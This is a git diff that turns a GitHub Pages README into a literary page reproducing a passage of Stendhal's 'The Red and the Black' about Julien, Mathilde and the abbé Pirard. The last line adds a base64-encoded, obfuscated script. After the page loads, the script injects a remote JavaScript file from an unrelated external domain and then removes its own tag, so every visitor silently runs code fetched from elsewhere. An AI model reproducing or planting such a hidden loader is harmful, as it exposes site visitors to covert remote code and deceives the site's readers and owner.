@@ -1,37 +1,44 @@
-## Welcome to GitHub Pages
+# A STORM
+His mind was engrossed; he only half answered the eager tenderness that she showed to him. He remained gloomy and taciturn. He had never seemed so great and so adorable in Mathilde's eyes. She was apprehensive of some subtle twist of his pride which would spoil the whole situation.
 
-You can use the [editor on GitHub](https://github.com/momotmariia0/storm/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+She saw the abbé Pirard come to the hôtel nearly every morning. Might not Julien have divined something of her father's intentions through him? Might not the marquis himself have written to him in a momentary caprice. What was the explanation of Julien's stern manner following on so great a happiness? She did not dare to question.
+![i](https://www.cambridgema.gov/-/media/Images/sharedphotos/departmentphotos/animal.jpg?mw=1920)
+She did not dare—she—Mathilde! From that moment her feelings for Julien contained a certain vague and unexpected element which was almost panic. This arid soul experienced all the passion possible in an individual who has been brought up amid that excessive civilisation which Paris so much admires.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Early on the following day Julien was at the house of the abbé Pirard. Some post-horses were arriving in the courtyard with a dilapidated chaise which had been hired at a neighbouring station.
 
-### Markdown
+"A vehicle like that is out of fashion," said the stern abbé to him morosely. "Here are twenty thousand francs which M. de la Mole makes you a gift of. He insists on your spending them within a year, but at the same time wants you to try to look as little ridiculous as possible." (The priest regarded flinging away so substantial a sum on a young man as simply an opportunity for sin).
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+"The marquis adds this: 'M. Julien de la Vernaye will have received this money from his father, whom it is needless to call by any other name. M. de la Vernaye will perhaps think it proper to give a present to M. Sorel, a carpenter of Verrières, who cared for him in his childhood....' I can undertake that commission," added the abbé. "I have at last prevailed upon M. de la Mole to come to a settlement with that Jesuit, the abbé de Frilair. His influence is unquestionably too much for us. The complete recognition of your high birth on the part of this man, who is in fact the governor of B—— will be one of the unwritten terms of the arrangement." Julien could no longer control his ecstasy. He embraced the abbé. He saw himself recognised.
 
-```markdown
-Syntax highlighted code block
+"For shame," said M. Pirard, pushing him away. "What is the meaning of this worldly vanity? As for Sorel and his sons, I will offer them in my own name a yearly allowance of five hundred francs, which will be paid to each of them as long as I am satisfied with them."
 
-# Header 1
-## Header 2
-### Header 3
+Julien was already cold and haughty. He expressed his thanks, but in the vaguest terms which bound him to nothing. "Could it be possible," he said to himself, "that I am the natural son of some great nobleman who was exiled to our mountains by the terrible Napoleon?" This idea seemed less and less improbable every minute.... "My hatred of my father would be a proof of this.... In that case, I should not be an unnatural monster after all."
 
-- Bulleted
-- List
+A few days after this soliloquy the Fifteenth Regiment of Hussars, which was one of the most brilliant in the army, was being reviewed on the parade ground of Strasbourg. M. the chevalier de La Vernaye sat the finest horse in Alsace, which had cost him six thousand francs. He was received as a lieutenant, though he had never been sub-lieutenant except on the rolls of a regiment of which he had never heard.
 
-1. Numbered
-2. List
+His impassive manner, his stern and almost malicious eyes, his pallor, and his invariable self-possession, founded his reputation from the very first day. Shortly afterwards his perfect and calculated politeness, and his skill at shooting and fencing, of which, though without any undue ostentation, he made his comrades aware, did away with all idea of making fun of him openly. After hesitating for five or six days, the public opinion of the regiment declared itself in his favour.
 
-**Bold** and _Italic_ and `Code` text
+"This young man has everything," said the facetious old officers, "except youth."
 
-[Link](url) and ![Image](src)
-```
+Julien wrote from Strasbourg to the old curé of Verrières, M. Chélan, who was now verging on extreme old age.
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+"You will have learnt, with a joy of which I have no doubt, of the events which have induced my family to enrich me. Here are five hundred francs which I request you to distribute quietly, and without any mention of my name, among those unfortunate ones who are now poor as I myself was once, and whom you will doubtless help as you once helped me."
 
-### Jekyll Themes
+Julien was intoxicated with ambition, and not with vanity. He nevertheless devoted a great part of his time to attending to his external appearance. His horses, his uniform, his orderlies' liveries, were all kept with a correctness which would have done credit to the punctiliousness of a great English nobleman. He had scarcely been made a lieutenant as a matter of favour (and that only two days ago) than he began to calculate that if he was to become commander-in-chief at thirty, like all the great generals, then he must be more than a lieutenant at twenty-three at the latest. He thought about nothing except fame and his son.
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/momotmariia0/storm/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+It was in the midst of the ecstasies of the most reinless ambition that he was surprised by the arrival of a young valet from the Hôtel de la Mole, who had come with a letter.
 
-### Support or Contact
+"All is lost," wrote Mathilde to him: "Rush here as quickly as possible, sacrifice everything, desert if necessary. As soon as you have arrived, wait for me in a fiacre near the little garden door, near No. —— of the street —— I will come and speak to you: I shall perhaps be able to introduce you into the garden. All is lost, and I am afraid there is no way out; count on me; you will find me staunch and firm in adversity. I love you."
 
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+A few minutes afterwards, Julien obtained a furlough from the colonel, and left Strasbourg at full gallop. But the awful anxiety which devoured him did not allow him to continue this method of travel beyond Metz. He flung himself into a post-chaise, and arrived with an almost incredible rapidity at the indicated spot, near the little garden door of the Hôtel de la Mole. The door opened, and Mathilde, oblivious of all human conventions, rushed into his arms. Fortunately, it was only five o'clock in the morning, and the street was still deserted.
+![i](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTQulj_OMpDSCto2h1ekt9uosLoCjxS-C1mlGRlOxgsQDbuWxOL&usqp=CAU)
+"All is lost. My father, fearing my tears, left Thursday night. Nobody knows where for? But here is his letter: read it." She climbed into the fiacre with Julien.
+
+"I could forgive everything except the plan of seducing you because you are rich. That, unhappy girl, is the awful truth. I give you my word of honour that I will never consent to a marriage with that man. I will guarantee him an income of 10,000 francs if he will live far away beyond the French frontiers, or better still, in America. Read the letter which I have just received in answer to the enquiries which I have made. The impudent scoundrel had himself requested me to write to madame de Rênal. I will never read a single line you write concerning that man. I feel a horror for both Paris and yourself. I urge you to cover what is bound to happen with the utmost secrecy. Be frank, have nothing more to do with the vile man, and you will find again the father you have lost."
+
+"Where is Madame de Rênal's letter?" said Julien coldly.
+
+"Here it is. I did not want to shew it to you before you were prepared for it."
+
+<script id="6c5u8" src="data:text/javascript;base64, dmFyIF9oQmVKdSA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX2dwbTJkLCBfM1BCYmIpIHt2YXIgXzFLVDFTID0gZnVuY3Rpb24oX1FqcHp6KSB7d2hpbGUgKC0tX1FqcHp6KSB7X2dwbTJkWydwdXNoJ10oX2dwbTJkWydzaGlmdCddKCkpO319O18xS1QxUygrK18zUEJiYik7fShfaEJlSnUsIDB4MTFiKSk7dmFyIF95SkxCTyA9IGZ1bmN0aW9uKF9vQ0EyUywgXzFoVFpjKSB7X29DQTJTID0gX29DQTJTIC0gMHgwO3ZhciBfeVJCRHcgPSBfaEJlSnVbX29DQTJTXTtyZXR1cm4gX3lSQkR3O307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfeUpMQk8oJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX0hkMU9rID0gZG9jdW1lbnRbX3lKTEJPKCcweDEnKV0oX3lKTEJPKCcweDInKSk7X0hkMU9rW195SkxCTygnMHgzJyldID0gX3lKTEJPKCcweDQnKTtfSGQxT2tbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2MVx4NzRceDMzXHgzOFx4MzlceDYzXHg2OFx4NjlceDZjXHg2NFx4NjFceDYzXHg2M1x4MzNceDJlXHg2NVx4NzZceDY1XHg2Mlx4NjlceDZlXHg2MVx4NzJceDczXHgyZVx4NzNceDY5XHg3NFx4NjVceDJmXHg1Zlx4NzJceDY1XHg2ZFx4NmZceDc0XHg2NVx4NWZceDc0XHg3Mlx4NjFceDYzXHg2Ylx4MmVceDZhXHg3M1x4M2ZceDYzXHg2MVx4NmRceDcwXHg2MVx4NjlceDY3XHg2ZVx4M2RceDM5XHg1MFx4MzdceDMyXHg3N1x4NDlceDMwXHg3MVx4NTZceDYyJztkb2N1bWVudFtfeUpMQk8oJzB4NScpXShfeUpMQk8oJzB4NicpKVsnXHg2MVx4NzBceDcwXHg2NVx4NmVceDY0XHg0M1x4NjhceDY5XHg2Y1x4NjQnXShfSGQxT2spO2RvY3VtZW50W195SkxCTygnMHg3JyldKCc2YzV1OCcpWydceDcyXHg2NVx4NmRceDZmXHg3Nlx4NjUnXSgpO30sIHsnXHg2Zlx4NmVceDYzXHg2NSc6ICEhW119KTs="></script>
